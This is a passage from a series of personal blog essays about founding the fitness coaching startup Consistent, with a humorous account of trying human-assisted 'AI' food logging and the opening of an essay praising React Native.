elements that make up your meals. And for the occasional meal for the
enjoyment --- as long as it's planned --- can be made to work with your
goals.

The more you continue on this journey, the more surprises you'll find.
For example, you'll realize much of the unhealthy food serves for
neither nutrition *or* enjoyment. For example, what's the purpose of a
drink at a party? Though it's a lubricant for some, for me I realized,
it was simply to "hold something in my hands in a relatable way", while
I socialized with others.

After every iteration, you'll work out solutions that help you address
the real problems your choices are trying to address. The more aware you
become, the more your relationship with food changes. It stops being a
hinderance, and reverses into an enabler: Now, you have the awareness to
use nutrition to help you perform at your best.

*Thanks to Trevor Toy, Daniel Woelfel, Joe Averbukh for reviewing drafts
of this essay*

*Note: This kind of iterative cycle is exactly what we\'re doing
with[consistent](https://consistent.fit). The cohort is now closed and
we\'re iterating, but feel free to sign up on the waitlist \-- based on
what we learn we may open future cohorts!*

# Founder Diaries: The First 2 Months of Consistent

*Note: we are close to finishing up our initial cohort
of[consistent](https://consistent.fit)! I wanted to take stock of what's
done, and this essay resulted. Hopefully it (a) gives a sense of how
startups are like at the very early stages, and (b) is entertaining to
read for ya 🙂.*

Consistent was born in early June.

### Zeneca Days

Previously we were working on [Zeneca](https://zeneca.io), a better
Goodreads. Within a month we hit a thousand users, and did a bunch of
fun stuff with Clojure. This felt great, but very soon we were awakened
to one the most important startup lessons: you gotta look at the *right*
metrics. Sure, number of users were nice, but what about weekly active
users? If weekly active users weren't high, it would mean (for our case)
that what we were doing wasn't valuable. And if the number wasn't
growing, it would mean we were *losing* users.

Alas, our weekly active users number was not growing. The problem we
solved --- creating beautiful [lists](https://zeneca.io/joe) for books
--- was *nice* but not *gripping* need for users. We iterated, but
didn't find a specific hit. Eventually, we took stock and realized that
this space wasn't what we'd want to fight for over the next 10 years.
The decision was tough but after a good week of reflection, we did it.
The product was in a stable place, so we kept it running and moved on.

### The Walk

Back to the drawing board. This time, we wanted to work on a
*hair-on-fire* kind of problem for users. To come up with ideas, Joe was
reading Data Intensive Applications, and I was mulling over problems
with [databases.](https://stopa.io/post/279) And of course, we did what
every startup founder would do: religiously read Paul Graham essays over
and over.

One day, on the nth re-read of one of PG's [ideas
essays](http://www.paulgraham.com/startupideas.html), a question stood
out: "What's unusual about you". If you're unusual in some way, and more
people will be that way in the future, it's fruitful ground for new
ideas.

I went on a walk to reflect, and sure enough an idea struck: "Wait, for
years I've spent close to thousand dollars a month on fitness\...that
can't be normal."

The more I unraveled that thread, the more excited I became. Joe had the
same kind of unnatural dedication to fitness --- he logged for years and
built a whole suite of [tools](https://joelogs.com). Since we were both
in high school, we had a bucket-list item to have six-pack abs, and gosh
darn it we would get em.

Why were we paying so much, and why were we spending so much time? It's
because though fitness was in a sense simple (in that increasing
stressors helps you grow, and it's ultimately guaranteed to be
achievable), it was elusively difficult (in that your body is reflexive,
you're likely to plateau, and need to get multiple things right for
enough of a time to see results.)

To achieve our goals, we had built a system where a personal trainer
would guide our workout progressions and nutritional goals, and we had
tools we hacked together to build visibility for how we were doing. It
was expensive and filled with schleps, but it was getting us better and
better results. In one view, we were paying a sort of tax to live in the
future.

I thought to myself, "what would a magical experience look like?". I
imagined an app that could take you from where you were, and guide you
into the best shape of your life. It would bring together all the
disparate information you need to know, alongside tools that gave you
visibility and guidance.

I knew there was nothing like this today. Apps were fragmented and went
nowhere near what it took to achieve results. Even with hiring a
personal trainer and a dietician, you still had to do personal research,
and would likely use crappy tech. Could we create this magical
experience? An app that gets you into the best shape of your life... It
became clearer to me that this was where the world was headed.

### Things that don't scale

So, we had a guiding light --- there was opportunity to innovate in
Fitness. How do we start?

The closest-at-hand solution was to start small and build some sort of
app. Perhaps we could start with a fasting or workout app for example,
and expand from there.

The downside on this path, was that it was unlikely to produce a truly
differentiated product. There are a lot of options, and by definition a
subset solution can't produce grand changes. We feared that users would
only mildly like it. That would mean that they wouldn't be as engaged,
which would make both acquisition and learning harder. We'd be doing
Zeneca all over again.

Another option was to go all-in on a machine-learning based solution.
There were some subsets that could be tackled: generating workout plans,
calorie detection, nutritional guide generation. I had spent 4 years
working in the ML space (though as an engineer, not a researcher) and
had a carpenter's sense of what was possible. I didn't think you could
reach the kind of experience a personal trainer could deliver, but I did
think there was ripe opportunity to build exceptional tools.

The big problem with the ML direction, was that it would take a long
time to experiment and launch a truly differentiating product, and it
presupposed fitness expertise. We were enthusiasts in fitness, but we
were not yet experts (we didn't even have six-packs yet! \[1\]). It
would take us too long to build up the knowledge of users we needed to
create a winning product by following this path.

So, then, we considered one more approach: what if we just started a
cohort, and tried to deliver this magical experience to them? By going
this route, we'd get a deep sense of how it was like to coach others,
and exactly what was needed to help people succeed. We would *really* be
able to work towards a compelling result, and from day one, we would be
delivering a product that was truly exceptional. From there, with highly
engaged users, we could iterate towards more and more scaled solutions.

At Facebook I helped build M, a personal assistant that could answer any
question. We did this by augmenting human support agents. Though we had
trouble automating when the tasks were too varied, we got good in
verticals: from restaurant orders to appointments to event hosting. It
was a bet, but I thought that it *could* be possible to scale an
experience that felt like support from a personal trainer and a
dietician. In the best case we could build the magical experience at
scale, but even if that didn't work, we'd have such engaged users, that
we could extract out products that solve subset problems 10X better.

### The launch

So, we followed the last approach. We popped up a landing page, and
launched a free cohort on [Hacker
news](https://news.ycombinator.com/item?id=27594133). From there we got
about 200 emails, and selected 20 people to join the group.

Initially, we did this all over Slack and Google Sheets. The structure
looked like this:

The user would send us their weight every day on Slack. This was an easy
task that could serve as a touchpoint. They would log their food on
MyFitnessPal every day. They would add us as friends, which would allow
us to see their diaries. Next, at the end of every week they would send
a progress photo, as well as a reflection of how the week went. Each
week, would layer on new goals that would help them get to a six-pack.
From logging to setting macro goals, to tuning their movement, we'd
layer changes to help them reach a six-pack.

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzEzMTAwNTY4NS0zNjhlY2FlNS1hOGY3LTQwMjMtYmEzNy1hNTc0NTg0MWQ5MDgucG5n)

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzEzMTAwNTcyMS0wZGUyZGE3Ni1jNTBhLTQ4YWUtOGJjNC1jZjdjMmE5MjljNzIucG5n)

### The Initial Pain

For the first week and half or so, the pain in the business was acute.
We would manually ping each person a reminder about their weight, had to
look over their MyFitnessPal diaries, and make sure nothing was amiss. I
personally find it very hard to do "manual tasks" for myself (laundry,
taking out the trash, etc has been a perennial problem for me), so this
felt especially painful. On a particularly dreary day, I would find
myself daydreaming and comparing this to working on a database, writing,
or programming in Clojure...oof.

Thankfully, Joe's spirit was high, and he took some slack off of me,
which gave me the space to find resolve. At the end of the day, we knew
that we had to do these schleps to really feel the pain and understand
what our users wanted. It's so easy to read all these essays about
"doing schleps" and think to yourself "yeah, I can do that" --- turns
out it's much harder in practice.

### Rafael

Very soon after, we started to move off the Google Sheet and began to
build tools that helped us do these manual tasks. A slack bot would
automatically log weight, progress pictures, and reviews. We also built
a quick cron job that woulds scape everyone's MyFitnessPal and plop it
into our database. This allowed us to automatically detect problems
(missing days, too high / too low calories), and create analytics tools
to more quickly figure out how each user was doing. This decreased our
maintenance load from at least a few hours of work each day, to 1 day a
week. For that one day, the majority of the time was spent going through
each user to build up a weekly review for them. The reminders about
weight, diary logging, and the rest were no longer necessary!

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzEzMTAwNTc1Ni0xODdhMmJmZi00NmY1LTQyZjUtYTcyOS01ZTRlYmY3NzU4MDIucG5n)

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzEzMTAwNTc3NS1jYzBhODMyNy1kNWY2LTQwNWQtOTMyNC03ZTliNDM0MjExNTUucG5n)

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzEzMTAwNTc5Mi1mODAwYWQ0YS0xNGNhLTRiMmYtYjY1MC1jMGUyZTE0YjUzMjAucG5n)

### The Content

As our manual tasks decreased into one day, Joe and I were able to
dedicate time to ramping up coaching literature. Joe went through all of
Noom's course, as a sort of competitive analysis. I finished the
"[certification textbook](https://twitter.com/stopachka)" Equinox
trainers use to become nutritional coaches. From there and from what we
had learned with issues users had, we built up content to help make
progress and overcome plateaus.

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzEzMTAwNTgyMC04ZWU4Mzg4ZC0wYTEyLTQxMWUtOWUxOC0zZjc2ODMzNDI5ZDMucG5n)

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzEzMTAwNTgzMC02YzAwZmY1Mi0zMGI5LTRhMDMtYmYwMy0xNDA5ZmNjODE5M2YucG5n)

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzEzMTAwNTg1My0zMmQyZDIxYS00OGZkLTQzODktOWViMC0yY2M0MmFkYjY5ZTgucG5n)

### The App

As users made progress, we began to look at the next big win we could
offer them. We noticed that the most difficult bit was putting all the
data together, to offer insight for change. We thought, what if we made
a *really* nice UX to help you see how you're doing?

So, we started hacking together an app. Last week, we launched its first
screen --- a page that shows you how your week is progressing. This
week, we're working on the "Report" tab --- a view which will help us
write about \~70% of the content we already write for weekly reviews.

There's so much more to do. As we go further, we're realizing the need
in integrating sleep and stress, and are constantly relying on a slew of
different apps to get things done. What if it was all well-integrated?

*Note: (the reports tab, second video, currently has partially stubbed
data)*

### Feedback so far

One month in, we ran a survey, and received about 16 responses.
Following the [Superhuman PMF
test](https://review.firstround.com/how-superhuman-built-an-%20engine-to-find-product-market-fit),
we asked them how disappointed they would be if Consistent was no
longer.

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzEzMTAwNTg5My1jNjZjODA5Ny04OTE5LTRlY2UtOTAwZC0yYmZjNmQ3ZDMwYjcucG5n)

43% (7 people) answered "very disappointed". The answers noted how happy
they were to discover the structure they needed to be accountable, as
well as the guidance and feedback we provided for them to iterate every
week. Some favorite quotes:

> I feel it\'s improving both my body and also my outlook on life.
> Whilst the end goal is a six pack, the steps look to be making me a
> healthier and more well rounded individual.
>
> I've hit an all time low after I started with consistent. I think
> having a check in has kept me accountable about my food choices, and
> it helps me bounce back when those choices aren't so hot.
>
> I love the motivation to actually consistently (hah) work out and eat
> right. It's been a total game changer for my personal fitness to be a
> part of a group with similar goals and I love it.
>
> It\'s the first time I feel I\'m making progress towards consciously
> losing weight. Not a lot of tech, but the community + accountability +
> guidance based on data has been game changer.

For those who were "somewhat" disappointed (5), the main feedback was
that though Consistent helped them go faster, they had learned the
important bits now, and felt that they had enough self-belief that they
would not be crushed if we were no longer around, and could continue on
their journey:

> I love that consistent has helped me get consistent. But from here,
> I'm getting more value from MFP and the habits I've built than the
> group. I no longer need the accountability to keep me on track.
>
> What can I say? Before Consistent, I was 7 lbs heavier.
>
> Could I have done it without y\'all? Maybe. But I don\'t think I\'d
> have progressed as aggressively without the motivation and
> accountability.

For the "not disappointed" group (4), 2 of them misunderstood the
question. They knew that since this was a 3 month program, it would end,
and were thinking that we asked how they would feel once it ended. The
message was similar to the "somewhat" group, in that they would be happy
because they learned a lot:

> I think I've learned so much in a way that I have a lot knowledge of
> how to track my health, nutrition intake... etc. therefore, I would
> not be disappointed (in a good way) if I no longer user Consistent in
> a way that I think I might be able to handle it myself. Consistent
> helped my to get to this point.
>
> I like the tracking, the feedback and the community, but I feel that
> the mission statement was to reach a milestone, and so I'll be happy
> to celebrate with the cohort once the time comes, but in a good way -
> not heartbroken because this was what consistent proposed in the first
> place.

For the remaining two, the main criticism was that they already had a
system, and didn't believe that the coaching / content was necessary for
them. We also "force" a bit of a schelp on users: they need to submit
their weight manually each day. This schlep was a bit too much for some,
since they have smart scales:

> I feel I also had gotten into a good habit of tracking before this, so
> it felt like added overhead.
>
> This includes having to double track exercises and slack weight / body
> fat when it\'s something that\'s been syncing with my health app for
> example.
>
> Before Consistent I was quite aware of my weight progression (daily
> weight), some nutrition guidelines and I was doing different exercises
> (but moving already). Consistent added the need to do food logging
> (that I don\'t particularly like) and didn\'t gave me any other
> guideline on how to move better.

### Integrating Feedback

Users have lost an average of 4LB over the last month. It's been
surprising and inspiring to see the kind of changes folks have made:
from sedentary life filled with processed foods to daily movement,
hitting 30% protein goals.

The 43% "very disappointed", excites us. It feels like we are onto
something. From here, and observing the 2 "not disappointed", openness
to change is crucial for the program. Folks who are open to try new
things, and are determined enough to earnestly give difficult changes a
shot have shown exceptional results.

In the "somewhat disappointed" camp, in some way I am happy that the
structure is valuable. I do think that a person can achieve quite a bit
with logging daily, doing a weekly review, and taking weekly progress
pictures. I do think though that after about a month or so of progress,
the body gets used to the deficit and exercise load, and will tend to
plateau. To get through it, they may need more coaching. I think this is
where some of Consistent's secret sauce will come in especially useful.

For the "not disappointed" camp, though coachability is a factor, I do
think reducing schelps is going to be helpful. We are conflicted about
the shlep of logging weight, as counterintuitively it's a very easy way
to be "present" about your progress, and have a touchpoint. We are
considering other ways to achieve this, perhaps with a daily report.

### Next Steps

Priority 1 is to lead the cohort to a successful outcome. In that
process, we'd like to continue to improve our weekly review efficiency,
improve the app, and produce more content.

Priority 2, is to set up a second cohort of 50 people, and begin to
charge. 50 is a sufficiently challenging scale for us at this point, and
could continue help us refine the program. If we charge 200 dollars a
month, I think it'll be sufficient to prove out the value, and select
for the kind of customers we'd like to have. I think we could charge
more, but at 100 dollars a month, it's more of a no-brainer. To do this,
we'll start by writing content, (Joe is working on "365 days of
logging", and "Experiments in Nicecream" as we speak), and reaching out
to our extended networks.

We're also deciding if we should be making the program a "4 month"
cohort, or a community. One thing we realize, is that 4 months is indeed
aggressive to achieve "clearly defined six packs", though it's long
enough to reach real transformation. If they continued on, they could
keep growing. We personally also experienced how nice it is to continue
working with a coach --- I worked with my personal trainer for 4 years.

### Even further ahead

As the 50-person cohort moves through, we intend to start creating an
iPhone app.

Currently, much of our engagement happens over MyFitnessPal and Slack.
Though this is great for moving fast, we want to start to gain much
finer control over these surfaces. We'd be able to iterate on that UX
create a more and more magical experience.

Towards the end of that, there'll be an inflection point, where we'll
need to decide if we want to start scaling as a "Noom-like" app, or a
"Lambda-school" like app. This still requires more thinking --- if you
have any thoughts we definitely would to hear it!

### Painful Problems

From a startup perspective, by far the most important lesson we learned,
is the value of solving a *very painful* problem for people.

On Zeneca it was hard to see daily usage. On this one, you can't help
but see it. The critical nature of the problem is also motivating: there
were times when it was tough to do the schelp work, but we reminded
ourselves, "hey, our users are counting on us." It's not a formula for
every startup, but indexing on a tough problem that users will engage
with daily can be great for bottom- up building.

*Thanks to Joe Averbukh, Daniel Woelfel, Kam Leung, Thomas Schranz for
reviewing drafts of this essay*

# Experiments with "AI" and Diet Logging

*I recently fell into a spell of P.G Wodehouse novels. His style
inspired me \[1\], and I scribbled this essay to experiment with it.
It's an eccentric mix of a "true" story (heavily embellished for comic
effect), with a sprinkle of some ideas that may actually be useful. I
hope you enjoy it!*

------------------------------------------------------------------------

Sometimes, you have a period in your life where all the cards are just
right and every wish seems to conjure up before you, as if the universe
decided to give you special treatment. A "personal renaissance", if you
will. I had once such period a few years ago, and it precipitated a
multi-year quest. I wanted to relate the tale to you.

### The Sauna

Our tale starts in 2018, when I worked at Facebook. I was hacking away
at a product launch for F8 (our yearly developer conference), and we
were a few weeks away from the big day. The inevitable crunch led me to
a kind-of- dizzying-yet-thrilling quantity of work, and I found myself
ubering back from the office every night at 9PM.

On one such an occasion, an indescribable urge came over me...I
absolutely needed to go to the Sauna. A stranded dog would miss their
owner less than I missed the vivifying steam of the Sauna. This may
sound unusual, but at least in Georgia (the country I'm from) a good
hour in heat is a staple for stress relief and general grooming (even
Stalin was a fan), and boy was I in need.

Now, I was hazily aware that Archimedes Banya was nearby, but the idea
of *calling* them and making a reservation plunged my uber ride in an
atmosphere of dread.

If you asked any of my friends how I felt about making appointments,
even the most charitable would say that unless I had a surge of some
exceptional iron will, I'd have to be dragged kicking and screaming to
the task, and unless vigilantly watched, I'd figure out some way to
noodle out of it.

Well, there was no iron will left that day, and threats from a KGB drill
sergeant couldn't have forced me to make a phone call. So, temporarily
defeated, gazing out of the window into the twilight, I made a quiet
promise to myself. Once I finished with this launch, I said, I would
solve this problem once and for all. I would set things up so I could
plunge into a Sauna whenever I darn well pleased --- appointments and
phone calls be damned.

Fast forward a few weeks, and I signed the dotted line at the local
Equinox. It was an ingenious hack if I say so myself: cheaper than going
to a spa, available late into the evening, and I didn't need to make an
appointment. They even had *two* Saunas at the market street location: a
lemon-scented steam room and the traditional wooden cabin room.

Boy did I revel in this victory. Once every few days, I'd rocket into
the Equinox and shoot towards the change room. Determined and with towel
in hand, I'd slow down my pace to a saunter, and eye the steam room. A
leisurely hour of heat and ritual of cold plunges later, I'd strut out a
newer, calmer man.

The ritual complete, I'd meander to the nearby Katsu Curry Place, with
the air I imagine Napolean took on when he went on an evening stroll in
Versailles. I'd finish the day with the satisfaction of a man who knew
he had spent an evening he wouldn't regret.

### The Habit

Now, if any person heads into the change room of a gym every day for a
month, and notices that the other folks seem to be gung-ho about what
happens *after* the change room, they're bound to get curious. One day,
the urge to explore overtook me, and I delayed my usual leg towards the
curry place, and took a gander at the facilities.

Well...it wasn't so bad! A few bicep curls later, I thought it wouldn't
hurt to delay the restaurant and fit in a workout once in a while. Some
weeks of this, and I began to noticed physical and emotional changes.

The progress inspired me to work out more, which produced more progress,
and the kind of habit-forming loop that James Clear \[2\] himself would
be proud of emerged. Victory upon victory, I felt. Now I had daily
access to *two* Saunas, *and* workouts had become a routine.

### Discovering my Trainer

Well, the gift kept on giving. One day at the Equinox a friend and I
were taking a rest after a taxing set of squats, when he whispered,
"Hey, take a look at the guy behind you".

I rotated my gaze, to see a gentleman performing a superset of pushups
with the exactness of a surgeon suturing a 0.3 millimeter blood vessel.

His form was so impeccable that even the uninitiated would stagger in
their track to see what was happening, much in the same way I guess a
lay carpenter would have if he had seen Michelangelo sculpting away.
Whatever this gentleman was doing, you could tell that he was serous
about it, and that it worked.

It turned out he was a trainer at Equinox, and a person with a heart of
gold too. I started working with him a few weeks later, and experienced
a change in dimension for the workouts. Progress was ever-abundant.

### The Problem

A few months of this, and health was going swimmingly. Well, sort of. My
trainer told me that to get to the next level, I had to re-examine this
Katsu- Curry et al habit of mine.

He suggested that I use MyFitnessPal to log my diet. I went ahead and
installed the app.

From the login screen on I had a grim sense of foreboding. This did
*not* look like an app where the designers pained away their nights,
agonizing over user experience.

My fears were well founded. I was first plunged into ads. I realized to
my horror, that I had to tap *at* least 6 times \[3\] to log anything! A
few days of half-hearted effort and I dropped the app. Well, I had a
problem on my hands, but, I now had a weapon to solve it. I surged
straight to the sauna.

As I mulled the problem over, an idea arose. Instead of this tedious
task of tapping 6 times to log food, what if I started a new company,
built an app were you could just take a picture of your food, and it
would handle the rest?

Thrilling.

### "AI"

It would be the latest and greatest in AI. In some sense this would get
dangerously close to a level of complexity that no app previously had
touched, but I thought --- heck, why not try?

So, I did what every founder who wants to solve an AI problem verging on
general intelligence would do --- I started with a "human-augmented"
solution. I tabbed over to Upwork, and wrote a job posting:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzEzODU2NzUwNy1iOTQwNGUxYS03YTZiLTQxYWMtYTU1OC05MzcwNzFiMDBkZDMucG5n)

*The Job posting. Admittedly the response times were a bit too
optimistic*

Within a day, I got a storm of responses, filtered the ones who didn't
read the "When applying" section, and gave them all a test: I asked them
to log into MyFitnessPal, and show me what they saw.

This task turned out to be insurmountable for the majority, and filtered
about 90% of the applicants. Some more sleuthing, and I landed on a
skilled assistant.

### The Initial Experience

So, following the footsteps of the great scientists, I started the next
day and sent my first photo across the ether.

At the outset I was faced with a shock: I had to tap at *least* 5 times
to send a photo on Messenger! \[4\]. It was frustrating, but all was not
lost. I consoled myself, that at least sending a voice message was 4
taps, and in the case where I had to log some *custom* food, I'd be in
the black with convenience. So, I trekked forwards.

A day or two in, a second shock sprung forth. I noticed that with most
food, I would have preferred to have done a quick search myself, or to
have picked from a "recently used" component, rather than to have gone
through the "AI" process.

I co-discovered, alongside a many an AI enthusiast, that sometimes a
good UX can do wonders. Here, I consoled myself again. I reasoned that I
could \* *use the "re-send" option on Messenger, to achieve a workable
UX. Plus, if this was to become a business, I* could\* build a companion
app that had this too. So, I marched on.

A more painful shock came, when I discovered myself painstakingly
crafting 30 second videos to log food, putting in much the same effort
that photographers do when working with Victoria's Secret models. I made
sure every detail my assistant needed to log accurately was in the
frame, and this toil was inching me closer to the red when it came to
convenience.

### The Last Straw

Now, these changes I invented for myself where painful, but pain is much
easier to bear when you inflict it on yourself, so I bit through all and
trucked along for a few weeks more.

To my infinite chagrin, there was bombshell that I just couldn't ignore.

None of it worked! My nutrition wasn't changing.

Whether I sent photos or not, I'd discover myself at the Whole Foods in
the middle of the day, contentedly inhaling a few bags of cherries. Yes,
that's right, bags (In my defense, I felt like during cherry season it's
unreasonable, every store flaunting them around so much it's perilous
for an eye to wander).

### The "AI-Alternative"

So, I came back to the drawing board. After some grave reflection, one
idea struck me.

Maybe I was "forcing" this AI-type-of-solution --- A "hammer looking for
a nail", if you will. What if I looked at the problem with fresh eyes?
Thinking "from first principles", as Elon Musk would say.

So, I reflected on this, and a rough product spec began to materialize.
I thought to myself: "Hey, maybe I don't really need to log calories at
all. What if I just took photos, and made it shareable with my trainer?"

This way, he could look over it once every few weeks, and we could make
adjustments as needed.

### Clojure to the Rescue

So, I shared this idea with a friend of mine, and we jumped into hacking
up a solution in Clojure.

This time, we would use SMS instead of Messenger. This had the marked
benefit, that it would reduce the number of taps, and open up the option
of IOS shortcuts down the road. I would simply send photos, and it would
log it in the database. My trainer could then open a URL, and see
everything that was logged by date.

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzEzODU2NzUyNy03NTgyN2YxNS0yZTdiLTQwNDMtYTg0Zi1hMzViMzFlNzMxN2EucG5n)

*The AI hacker's NLP: string/lower-case, string/trim, string/includes?*

I felt like I had come across the first-principled solution alright.

I contentedly took pictures of my food, and week over week, my trainer
kept telling me to lay off some variety of cherries, mandarins, plums,
apricots, or Katsu Curry. Fruits was such a common pattern in the diet,
that we affectionately called our project "Pluot" --- a hybrid of plums
and apricots (this is a real fruit).

### ...The Second Defeat

Well, after a month of logging, the first-principled solution also fell
dead into the water.

The program itself was fine --- apart from a light desire to "edit" the
timestamp on photos --- it worked well enough. The issue was, that this
just didn't lead to any change in my nutrition.

No matter the feedback, I found myself myself in Facebook's "Micro
Kitchen" \[5\], polishing off the office's supply of mandarins. At this
point, I had tried the AI solution, and I had tried the first-principles
solution. I was at a loss for what to do.

So, I did what I guess every gentleman does after such a sound defeat. I
put the past behind me, and joined some military excursion in Africa.

Okay, I wish --- unfortunately I was a few generations too late for this
kind of thing, so instead I did the millennial analogue. I plunged
myself into hacking on products, went to Machu Pichu and Africa
(Admittedly, with more convenience than what similar spirited youths
experienced in the past. On our hike in Machu Pichu, porters were
somehow able to bake a cake in the wilderness)

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzEzODU2NzUzNS0xMDYwOTFiMC1kZTg1LTRmNDktOTRjOC1mMTNjMjIwNzE5OGIucG5n)

*A modern byronic adventure*

### The Haze

In the same way the military man back from Africa is no longer the
diffident young English lord he once was at the outset, I think my
friends would all agree, that this period had changed me: I had
"bloomed", if you will.

All the travel and the hacking had its effect, but, perhaps even more
importantly, I had continued my reading habit, and it evolved to
unnatural proportions. I think if Amazon had been a local store, they
would have been suspicious about me being a reseller of sorts.

You see, the time a gentleman consumes waiting in line for coffee
(especially in San Francisco coffee shops) and airport delays adds up.
Combine that with a predisposition to lounge around on Sundays, and you
have a person with a formidable library.

### A Lebanese Light

Over those years, Nassim Taleb was one of the two authors who I found
myself addictively re-reading. His work is the kind that protests at
being read while waiting in line at a coffee shop, and forces you to
find a chair to sit and nurse an Americano too in rapt attention.

The experience is similar to visiting an eccentric grandfather at his
luxurious country house, to discover him lounging in the veranda, a
half- finished bottle of self-made wine on the table, ready to impart
you with wisdom and wit.

Now, I had already read Nassim's work in the outset of the story, but as
I said, his work changes with you, and I had undergone some change.
Plus, you're bound to understand a work differently after the sixth
re-read.

On one such a Sunday, I was perusing over his ideas on Phenomenology and
Theory, when I had a breakthrough. He says that Phenomenology (the study
of "what works") is more robust than Theory (the study of "why" things
work).

This plays out intuitively. In finance for example, you can be sure that
there are going to be market cycles and sharp swings in price. But
*why*? Well, the answer changes every year. You'll find many an
economist with strong opinions, but without consensus in sight.

The nub is, we *love* theories, to the point where we can't help but be
fooled by them. You pick some theory about why foreign bonds should cost
what they cost for example, and proceed to plunge down a highway to
bankruptcy, while you tell yourself how the "market is irrational" along
each setback \[6\].

We never get apprised of this lesson. Each time, a new economist
integrate the "data point" that got away (a euphemism for bankruptcy in
this case), and comes up with a new theory. Moving forward, this new
theory seems indestructible and accurately predicts the past. Of course,
the future is another thing.

### Phenomenology of Nutrition

From there I grasped the errors of my youthful adventure. When I started
on my quest, I had never successfully changed my nutrition
before....yet, there I was, confidently picking theories, hiring
assistants, and plunging straight towards defeat.

With my new wordly wisdom under my belt, I reconsidered the problem.
What was the *phenomenology behind good nutrition?*

Instead of starting off with theory, I started by looking at what my
friends *who had* succeeded in losing weight had actually done. I went
back to the advice my trainer gave me. My best friend and co-founder Joe
had achieved success here, and I took a closer look at what he did.

Before, when I saw him log his diet for example, I was certain that he
had either an inordinate amount of self-discipline, or a Mother
Theresa-like patience when it came to poorly-designed iPhone apps.

But that wasn't the case. He simply logged differently. When in a
crowded place for example, he'd take pictures so he could log at a later
time. If it would be particularly tedious to log a specific food (say he
was stranded in the middle of Mexico, and got pollo con idunno), he'd
find something analogous (Chipotle) and log that.

A series of these optimizations had led him to log consistently, with
enough accuracy to diagnose issues as they came along. To steal the
story from Nassim, it made me feel I like the way the first weary
traveler lugging his luggage must have felt, when he discovered the
invention of the wheeled suitcase.

### The Intangible

At a glance, the ideas seemed simple and theorizable. For example: maybe
it's all about the balance of accuracy and consistency in your logging.
But, before we move too fast: what about the adjacent skills that it
created? As I logged more for example, in the same way a horse-whisperer
learns to communicate with the animal, I felt like I began to "sense"
the nutritional makeup of food. The schelps I underwent attuned me to
how certain foods made me feel, and how it would affect the rest of my
day. Where do we include this in the theory?

The most judicious path, I learned, was to rely on experimentation.
Start with what works, and tweak from there. Joe and I continued to
experiment, ended up hacking up a business in the process.

![Group 1
(5)](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzEzODU2OTQxNy0wN2Q0ZTcwMy1kMGZhLTQ1YjMtODU2OC00NjY5MDJjMGQxMzIucG5n)

That realization in one sense completed the quest, but in another,
kicked off a whole new one. There's so much more to observe and learn.

------------------------------------------------------------------------

*Are you thinking seriously about your health and fitness? Want to take
it to the next level? Joe and I are hacking on*
[*consistent.fit*](https:///consistent.fit) *. The current cohort is
closed, but sign up for the waitlist, if you'd like to be notified when
we finish this one!*

------------------------------------------------------------------------

*Thanks to Joe Averbukh, Daniel Woelfel, Ian Sinnott, Jacky Wang, Mark
Shlick, for reviewing drafts of this essay*

# A Love Letter to React Native

Since its inception, I scowled skeptically at React Native. I thought it
was yet-another magical framework that promised to boil the ocean for
you. All I needed was a tolerating ear, and I'd set off: "With these
magical frameworks, you end up with tarpits":

The first tarpit, was the tarpit of the "golden path". Things are smooth
when you're building a todo app, but what about when you need do
something special? Suddenly you find yourself sludging through poorly
created abstractions, debugging some object-oriented reaction between
React Native and iOS/Android text inputs, cursing your past self for
putting you on this path.

The second tarpit, was the tarpit of "a thousand papercuts". You'd
accrue a slew of small bugs: flickery modals, slow loading times, and
weird input behavior. Invariably you realize that the app just "doesn't
feel native" *---* a euphemism for "it sucks". You may have to chuck the
whole thing, with the eyes of your teammates who trusted and respected
you burning through your soul.

This was the state of my thoughts for years. But like the river cutting
through rock, time cut through my ideas.

### Dipping our toes in Mobile

The first erosion came when I viscerally experienced just how painful
mobile development could be. To adopt one of Paul Graham's metaphors: we
web engineers are like folks in rich countries, who have no idea what
goes on in the favellas of mobile development.

Imagine minute-long build times even for simple apps. Just this can
unnerve a web developer. But imagine further, that all of those builds
are happening on brittle infrastructure, where you're bound to come
across a random transient issue every day \[1\].

And all that pain feels like an inconvenient itch, when you compare it
to the the deployment story. Imagine that to push a bugfix, people who
*don't work at your company* and *have no sense of urgency for you* ,
decide what you can ship. App broken for half your users? "We'll get
back to you". Ask for an "expedited review" and hope for the best.

We dipped our toes in native development a year ago with a simple app
\[2\]. Yes, Swift's functional reactive programming and sum types were a
joy. But the build times and the back-and-forths with App Review were
painful enough, that we told ourselves for any new app we built, we'd do
all that we could to stay on web. There was just no way to iterate
quickly enough on mobile.

### PWAs

This was why, when we first built Consistent \[3\], it was PWA first.
The app certainly "didn't feel native" --- but at least we could ship a
change whenever we wanted.

This state of things went on for a month or so, but we couldn't ignore
the reality of native UX. Any self-respecting fitness app should be able
